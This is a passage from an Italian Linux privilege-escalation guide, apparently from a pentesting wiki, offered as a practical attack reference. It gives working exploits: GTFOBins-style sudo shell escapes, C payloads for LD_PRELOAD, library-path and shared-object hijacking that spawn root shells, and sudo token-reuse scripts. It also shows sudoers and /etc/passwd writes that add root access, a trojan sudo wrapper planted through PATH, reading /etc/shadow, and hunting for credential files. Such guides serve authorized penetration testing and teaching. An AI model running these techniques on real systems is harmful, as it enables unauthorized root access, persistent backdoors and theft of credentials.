### Porte aperte

Verifica sempre i servizi di rete in esecuzione sulla macchina con cui non sei stato in grado di interagire prima di accedervi:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Controlla se puoi fare sniffing del traffico. Se riesci, potresti essere in grado di acquisire delle credenziali.
```
timeout 1 tcpdump
```
## Utenti

### Enumerazione Generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono nei sistemi, chi può **effettuare il login** e chi ha i **privilegi di root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Alcune versioni di Linux sono state colpite da un bug che consente agli utenti con **UID > INT\_MAX** di ottenere privilegi elevati. Ulteriori informazioni: [qui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [qui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [qui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Sfruttalo** utilizzando: **`systemd-run -t /bin/bash`**

### Gruppi

Verifica se sei un **membro di qualche gruppo** che potrebbe garantirti privilegi di root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Appunti

Verifica se all'interno degli appunti è presente qualcosa di interessante (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politica delle password
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Password noti

Se conosci una **password** dell'ambiente, **prova a effettuare il login come ogni utente** utilizzando la password.

### Su Brute

Se non ti preoccupa fare molto rumore e i binari `su` e `timeout` sono presenti sul computer, puoi provare a forzare l'accesso come utente utilizzando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` prova anche a forzare l'accesso come utenti.

## Abusi del PATH scrivibile

### $PATH

Se scopri che puoi **scrivere all'interno di una cartella del $PATH**, potresti essere in grado di ottenere privilegi elevati creando un backdoor all'interno della cartella scrivibile con il nome di un comando che verrà eseguito da un utente diverso (idealemente root) e che **non è caricato da una cartella situata precedentemente** alla tua cartella scrivibile in $PATH.

### SUDO e SUID

Potresti essere autorizzato a eseguire alcuni comandi utilizzando sudo o potrebbero avere il bit suid. Verificalo utilizzando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi inaspettati ti permettono di leggere e/o scrivere file o addirittura eseguire un comando.** Per esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di Sudo potrebbe consentire a un utente di eseguire alcuni comandi con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Nell'esempio seguente l'utente `demo` può eseguire `vim` come `root`, ora è banale ottenere una shell aggiungendo una chiave ssh nella directory root o chiamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva permette all'utente di **impostare una variabile di ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** al **PYTHONPATH hijacking** per caricare una libreria python arbitraria durante l'esecuzione dello script come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypass dell'esecuzione di Sudo ignorando i percorsi

**Salta** per leggere altri file o utilizza **symlink**. Ad esempio nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene utilizzato un **jolly** (\*), è ancora più facile:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID senza percorso del comando

Se il **permesso sudo** è dato a un singolo comando **senza specificare il percorso**: _hacker10 ALL= (root) less_ è possibile sfruttarlo modificando la variabile PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può essere utilizzata anche se un binario **suid** **esegue un altro comando senza specificarne il percorso (controlla sempre con** _**strings**_ **il contenuto di un binario SUID strano)**.

[Esempi di payload da eseguire.](payloads-to-execute.md)

### Binario SUID con percorso del comando

Se il **binario suid** **esegue un altro comando specificando il percorso**, allora puoi provare a **esportare una funzione** con lo stesso nome del comando che il file suid sta chiamando.

Ad esempio, se un binario suid chiama _**/usr/sbin/service apache2 start**_ devi provare a creare la funzione e esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

La variabile d'ambiente **LD\_PRELOAD** viene utilizzata per specificare una o più librerie condivise (.so files) da caricare dal loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come caricamento preventivo di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e impedire che questa funzionalità venga sfruttata, in particolare con eseguibili **suid/sgid**, il sistema impone determinate condizioni:

- Il loader ignora **LD\_PRELOAD** per gli eseguibili in cui l'ID utente reale (_ruid_) non corrisponde all'ID utente effettivo (_euid_).
- Per gli eseguibili con suid/sgid, vengono caricare solo le librerie nei percorsi standard che sono anche suid/sgid.

L'elevazione dei privilegi può verificarsi se hai la capacità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'affermazione **env\_keep+=LD\_PRELOAD**. Questa configurazione consente alla variabile d'ambiente **LD\_PRELOAD** di persistere e essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, potenzialmente portando all'esecuzione di codice arbitrario con privilegi elevati.
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Quindi **compilarlo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **aumentare i privilegi** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Un privesc simile può essere sfruttato se l'attaccante controlla la variabile di ambiente **LD\_LIBRARY\_PATH** poiché controlla il percorso in cui verranno cercate le librerie.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binario SUID - iniezione di .so

Quando si incontra un binario con permessi **SUID** che sembra insolito, è una buona pratica verificare se sta caricando correttamente i file **.so**. Questo può essere verificato eseguendo il seguente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Per esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (File o directory non esistente)"_ suggerisce un potenziale per l'exploit.

Per sfruttarlo, si procederebbe creando un file C, diciamo _"/path/to/.config/libcalc.c"_, contenente il seguente codice:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira ad elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C sopra in un file oggetto condiviso (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## Shared Object Hijacking

Infine, eseguire il binario SUID interessato dovrebbe attivare l'exploit, consentendo la compromissione potenziale del sistema.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un binario SUID che carica una libreria da una cartella in cui possiamo scrivere, creiamo la libreria in quella cartella con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se ricevi un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Questo significa che la libreria che hai generato deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è una lista curata di binari Unix che possono essere sfruttati da un attaccante per eludere le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è la stessa cosa ma per i casi in cui puoi **solo iniettare argomenti** in un comando.

Il progetto raccoglie funzioni legittime dei binari Unix che possono essere abusate per eludere le shell restrittive, escalare o mantenere privilegi elevati, trasferire file, generare shell bind e reverse, e facilitare altre attività di post-sfruttamento.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Se puoi accedere a `sudo -l` puoi utilizzare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se trova come sfruttare una qualsiasi regola di sudo.

### Riutilizzo dei Token Sudo

Nei casi in cui hai **accesso sudo** ma non la password, puoi escalare i privilegi **aspettando l'esecuzione di un comando sudo e quindi dirottando il token di sessione**.

Requisiti per l'escalation dei privilegi:

* Hai già una shell come utente "_sampleuser_"
* "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (di default è la durata del token sudo che ci consente di usare `sudo` senza inserire alcuna password)
* `cat /proc/sys/kernel/yama/ptrace_scope` è 0
* `gdb` è accessibile (puoi caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificare permanentemente `/etc/sysctl.d/10-ptrace.conf` e impostare `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi escalare i privilegi usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Il **primo exploit** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token sudo nella tua sessione** (non otterrai automaticamente una shell root, esegui `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Il **terzo exploit** (`exploit_v3.sh`) **creerà un file sudoers** che rende **eterni i token sudo e consente a tutti gli utenti di utilizzare sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<NomeUtente>

Se hai **permessi di scrittura** nella cartella o su uno qualsiasi dei file creati all'interno della cartella, puoi utilizzare il binario [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) per **creare un token sudo per un utente e PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza dover conoscere la password facendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file all'interno di `/etc/sudoers.d` configurano chi può utilizzare `sudo` e come. Questi file **per impostazione predefinita possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** riesci a **leggere** questo file potresti essere in grado di **ottenere alcune informazioni interessanti**, e se riesci a **scrivere** su qualsiasi file sarai in grado di **elevare i privilegi**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se puoi scrivere, puoi abusare di questo permesso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per abusare di questi permessi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Ci sono alcune alternative al binario `sudo` come `doas` per OpenBSD, ricordati di controllare la sua configurazione in `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Dirottamento di Sudo

Se sai che un **utente di solito si connette a una macchina e utilizza `sudo`** per ottenere privilegi elevati e hai ottenuto una shell all'interno di quel contesto utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e quindi il comando dell'utente. Quindi, **modifica il $PATH** del contesto utente (ad esempio aggiungendo il nuovo percorso in .bash\_profile) in modo che quando l'utente esegue sudo, venga eseguito il tuo eseguibile sudo.

Nota che se l'utente utilizza una shell diversa (non bash) dovrai modificare altri file per aggiungere il nuovo percorso. Ad esempio [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

O eseguendo qualcosa come:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Libreria Condivisa

### ld.so

Il file `/etc/ld.so.conf` indica **da dove provengono i file di configurazione caricati**. Tipicamente, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che i file di configurazione da `/etc/ld.so.conf.d/*.conf` verranno letti. Questi file di configurazione **puntano ad altre cartelle** dove verranno **ricercate le librerie**. Ad esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Ciò significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente ha le autorizzazioni di scrittura** su uno dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, su qualsiasi file all'interno di `/etc/ld.so.conf.d/` o su qualsiasi cartella all'interno del file di configurazione dentro `/etc/ld.so.conf.d/*.conf`, potrebbe essere in grado di elevare i privilegi.\
Guarda **come sfruttare questa errata configurazione** nella pagina seguente:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiando la libreria in `/var/tmp/flag15/` verrà utilizzata dal programma in questo posto come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacità

Le capacità di Linux forniscono un **sottoinsieme dei privilegi di root disponibili a un processo**. Questo suddivide efficacemente i **privilegi di root in unità più piccole e distinte**. Ciascuna di queste unità può quindi essere concessa autonomamente ai processi. In questo modo, l'insieme completo dei privilegi viene ridotto, diminuendo i rischi di sfruttamento.\
Leggi la seguente pagina per **saperne di più sulle capacità e su come abusarne**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permessi delle directory

In una directory, il **bit per "eseguire"** implica che l'utente interessato può fare "**cd**" nella cartella.\
Il bit **"lettura"** implica che l'utente può **elencare** i **file**, e il bit **"scrittura"** implica che l'utente può **eliminare** e **creare** nuovi **file**.

## ACL

Le Liste di Controllo degli Accessi (ACL) rappresentano il livello secondario dei permessi discrezionali, in grado di **sovrascrivere i tradizionali permessi ugo/rwx**. Questi permessi migliorano il controllo sull'accesso ai file o alle directory consentendo o negando diritti a utenti specifici che non sono proprietari o parte del gruppo. Questo livello di **granularità garantisce una gestione degli accessi più precisa**. Ulteriori dettagli possono essere trovati [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Concedi** all'utente "kali" i permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Ottenere** file con ACL specifiche dal sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessioni shell aperte

In **vecchie versioni** potresti **dirottare** una sessione **shell** di un utente diverso (**root**).\
Nelle **versioni più recenti** sarai in grado di **connetterti** solo alle sessioni di screen del **tuo utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.

### Dirottamento delle sessioni di screen

**Elenco delle sessioni di screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Allegare a una sessione**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## dirottamento delle sessioni tmux

Questo era un problema con le **vecchie versioni di tmux**. Non ero in grado di dirottare una sessione tmux (v2.1) creata da root come utente non privilegiato.

**Elenco delle sessioni tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Allegare a una sessione**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Controlla **Valentine box da HTB** per un esempio.

## SSH

### Debian OpenSSL PRNG Prevedibile - CVE-2008-0166

Tutte le chiavi SSL e SSH generate su sistemi basati su Debian (Ubuntu, Kubuntu, ecc) tra settembre 2006 e il 13 maggio 2008 potrebbero essere interessate da questo bug.\
Questo bug si verifica durante la creazione di una nuova chiave ssh in quei sistemi operativi, poiché **erano possibili solo 32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e **avendo la chiave pubblica ssh è possibile cercare la corrispondente chiave privata**. È possibile trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valori di configurazione interessanti di SSH

* **PasswordAuthentication:** Specifica se l'autenticazione tramite password è consentita. Il valore predefinito è `no`.
* **PubkeyAuthentication:** Specifica se l'autenticazione tramite chiave pubblica è consentita. Il valore predefinito è `yes`.
* **PermitEmptyPasswords**: Quando l'autenticazione tramite password è consentita, specifica se il server consente l'accesso agli account con stringhe di password vuote. Il valore predefinito è `no`.

### PermitRootLogin

Specifica se l'utente root può effettuare l'accesso tramite ssh, il valore predefinito è `no`. Valori possibili:

* `yes`: root può accedere utilizzando password e chiave privata
* `without-password` o `prohibit-password`: root può accedere solo con una chiave privata
* `forced-commands-only`: Root può accedere solo utilizzando la chiave privata e se le opzioni dei comandi sono specificate
* `no` : no

### AuthorizedKeysFile

Specifica i file che contengono le chiavi pubbliche che possono essere utilizzate per l'autenticazione dell'utente. Può contenere token come `%h`, che verranno sostituiti dalla directory home. **È possibile indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi dalla home dell'utente**. Ad esempio:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Quella configurazione indicherà che se si tenta di effettuare il login con la chiave **privata** dell'utente "**testusername**", ssh confronta la chiave pubblica della tua chiave con quelle situate in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

L'inoltro dell'agente SSH ti consente di **utilizzare le tue chiavi SSH locali invece di lasciare le chiavi** (senza frasi segrete!) sul tuo server. In questo modo, sarai in grado di **saltare** tramite ssh **su un host** e da lì **saltare su un altro** host **utilizzando** la **chiave** situata nel tuo **host iniziale**.

È necessario impostare questa opzione in `$HOME/.ssh.config` in questo modo:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*` ogni volta che l'utente passa a una macchina diversa, quella macchina sarà in grado di accedere alle chiavi (che è un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere** queste **opzioni** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** il forwarding dell'ssh-agent con la parola chiave `AllowAgentForwarding` (per impostazione predefinita è consentito).

Se trovi che l'Agente Forward è configurato in un ambiente, leggi la seguente pagina poiché **potresti essere in grado di abusarne per ottenere privilegi elevati**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## File Interessanti

### File dei profili

Il file `/etc/profile` e i file in `/etc/profile.d/` sono **script che vengono eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno qualsiasi di essi, puoi ottenere privilegi elevati**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato uno script di profilo strano, dovresti controllarlo per **dettagli sensibili**.

### File Passwd/Shadow

A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero avere nomi diversi o potrebbe esserci un backup. Pertanto, è consigliato **trovarli tutti** e **verificare se puoi leggerli** per vedere **se ci sono hash** all'interno dei file:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcune occasioni è possibile trovare **hash delle password** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd scrivibile

Prima di tutto, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Quindi aggiungi l'utente `hacker` e inserisci la password generata.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ad esempio: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi utilizzare il comando `su` con `hacker:hacker`

In alternativa, puoi utilizzare le seguenti righe per aggiungere un utente fittizio senza password.\
ATTENZIONE: potresti compromettere la sicurezza attuale della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**NOTA:** Nei sistemi BSD `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`, inoltre `/etc/shadow` è rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Ad esempio, puoi scrivere in qualche **file di configurazione del servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Per esempio, se la macchina sta eseguendo un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/**, allora puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Il tuo backdoor verrà eseguito la prossima volta che tomcat viene avviato.

### Controlla le Cartelle

Le seguenti cartelle potrebbero contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non sarai in grado di leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Posizione/File di proprietà strani
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File di database Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### File \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binari nel PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **File Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backup**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### File conosciuti contenenti password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), cerca **diversi possibili file che potrebbero contenere password**.\
**Un altro strumento interessante** che puoi utilizzare a questo scopo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) che è un'applicazione open source utilizzata per recuperare molte password memorizzate su un computer locale per Windows, Linux e Mac.

### Registri

Se riesci a leggere i registri, potresti trovare **informazioni interessanti/confidenziali al loro interno**. Più strano è il registro, più interessante sarà (probabilmente).\
